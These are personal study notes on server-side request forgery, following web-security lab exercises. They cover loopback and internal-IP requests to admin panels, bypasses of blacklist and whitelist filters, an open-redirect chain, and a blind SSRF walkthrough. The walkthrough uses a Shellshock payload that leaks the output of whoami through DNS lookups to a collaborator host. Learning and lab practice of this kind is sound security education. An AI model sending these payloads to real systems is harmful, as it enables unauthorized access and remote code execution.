# Server Side Request Forgery(SSRF)

![SSRF.png](Server%20Side%20Request%20Forgery(SSRF)%2045e354bcf4824f7bb098d4840aadc00c/SSRF.png)

## what is SSRF

- it is web security vulnerability that allows an attacker to induce the server-side application to make HTTP request to an arbitrary domain of the attacker's choosing.
- it cause the server to make connection to internal-only service within org's infrastructure.
- or they able to force the server to connect to arbitrary external system, for leaking sensitive data, such as Authorization creds.

## Impact of SSRF attacks

- the common impact is unauthorized access to data with in organization.
- in some situation it might allow attacker to perform RCE.

# Common SSRF Attacks

- the attacker induce the application to make an HTTP request back to the server that is hosting the application via its loopback network interface.(127.0.0.1/localhost)

`Example:`

- a store web fetch that item is in stock or not

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1

```

here front end request to Back end using REST API to query database for stock by the server it self

if we modify that request to

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin

```

we have make request to `/admin` panel using using server so we have request locally .
it can bypass normal access control and expose admin panel to attacker.

## Basic SSRF against the local server

- simple change the parameter that request to fetch stock or internal request
- `StockAPI=http://localhost/admin`
- The access-control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server itself, the check is bypassed.
- For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine. This provides a way for an administrator to recover the system in the event they lose their credentials. The assumption here is that only a fully trusted user would be coming directly from the server itself.
- The administrative interface might be listening on a different port number than the main application, and so might not be reachable directly by users.

## SSRF attack against other back-end system

- it arises when ssrf is where the application server is able to interact with other back-end systems that are not directly reachable by normal users.
- these also have `non-routable IP` address so it can't be accessed by Outer network.
- since they are not exposed to outer network they may contain some sensitive information and functionality without any authentication
- `example:` if they have administrative interface at `192.168.0.95/admin`

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin

```

got admin access

# Circumventing Common SSRF defenses

## SSRF with Blacklist-Based Input Filters

- some application block input containing hostname like `127.0.0.1 or localhost or sensitive URL like /admin etc`
- **ByPass**
- using alternative representation of `127.0.0.1` like
- `2130706433, 017700000001 , 127.1`
- registering own domain that resolves to 127.0.0.1, we use [spoofed.burpcollaborator.net](http://spoofed.burpcollaborator.net/)
- `Obfuscating blocked strings using URL encoding or case Variation`
- some times we need to `doble or tripple times` encoding the payload to bypass filter.

## SSRF with Whitelist-based input filters

- some applications only allow input that matches, begins with or Contains, a whitelist or permitted values.
- we evade filter in this situation by exploiting inconsistencies in `URL Parsing`
- You can use the `#` character to indicate a URL fragment. For example: `https://attacker-host#expected-host`.
- we can leverage DNS naming hierarchy to place required input into a fully-Qualified DNS name that we control. example: `https://white-list-domain.attacker-host`.
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- also use combination of these techniques and also see [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).
- some times we need to carefully see the response for exploiting ssrf that how it parsing our input.

## Bypassing SSRF filters via Open-Redirection

- sometimes possible to circumvent any kind of filter-based defenses by exploiting an `open redirect` vulnerability.
- `example:`
- if user submitted URL is strictly validated to prevent malicious exploitation of `SSRF` behavior. but if it allows `open Redirect` vulnerability. Provided the API used to make the back-end HTTP request supports redirection, we construct a URL that satisfies filter and result in a redirected request to the desired back-end target.

```
/product/nextProduct?currentProductId=6&path=http://attacker.domain

```

returns redirected to `http://attacker.domain`
we leverage `open redirect`vuln to bypass the URL filter and exploit `SSRF`

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin

```

- this exploit works because it first validate allowed domain and request trigger `open redirect` to make request to desired domain.

# blind SSRF

- it arise when application can be induced to issue a back-end HTTP request to supplied URL, but the Request from the Back-end request is not returned to front-end application.
- it is harder to exploit but it can lead to full `RCE`.

## Impact

- impact is lower than fully informed SSRF because of their one-way nature. but in some situation it exploited to achieve `RCE`

## How to Find and Exploit Blind SSRF

- the most of the way to detect Blind SSRF is Using `Out of band (OAST)` technique. that trigger HTTP request to external system That we control.
- we can also use `Burp Collaborator`.
- simply identifying Blind SSRF trigger Out-of-band HTTP request doesn't provide route to exploitability. since we can not view the response from the back-end request.
- some Blind SSRF can be found in `Referer:`header in the http Request.

## Blind SSRF with ShellShock exploitation.

- In [Burp Suite Professional](https://portswigger.net/burp/pro), install the "Collaborator Everywhere" extension from the BApp Store.
- Add the domain of the lab to Burp Suite's [target scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope), so that Collaborator Everywhere will target it.
- Browse the site.
- Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
- Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
- Send the request to the product page to Burp Intruder.
- Use `Burp Collaborator client` to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload: `() { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net`
- Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
- change the `Referer:` header to `http://192.168.0.221` here `SSRF` vulnerability is in `Referer:` header and there is some internal system that doesn't directly to outer network.
- we request to that internal systems `http://internal-ip` and brute force it to find which system is active and use `shell shock` vulnerability to exploit it to `RCE`.
- go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind `SSRF attack`. The name of the OS user should appear within the DNS subdomain.

## [research Paper : cracking the lens: Remote client exploits](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient)

## Finding Attack surface for SSRF

### Partial URLs in requests

- some times an application place only a hostname or part of the url path in to a request parameter.
- the value submitted is than incorporated server-side into a full URL that is requested.
- exploitability is limited since we don't have control of full URL

### URLs within Data formats

- Some applications transmit data in formats whose specification allows the inclusion of URLs that might get requested by the data parser for the format.
- example of this is the XML data format, which has been widely used in web applications to transmit structured data from the client to the server.
- when application takes data in `XML`this might be vulnerable to `XXE Injection`

### SSRF via Referer Header

- Some applications employ server-side analytics software that tracks visitors.
- This software often logs the Referer header in requests, since this is of particular interest for tracking incoming links.
- Often the analytics software will actually visit any third-party URL that appears in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.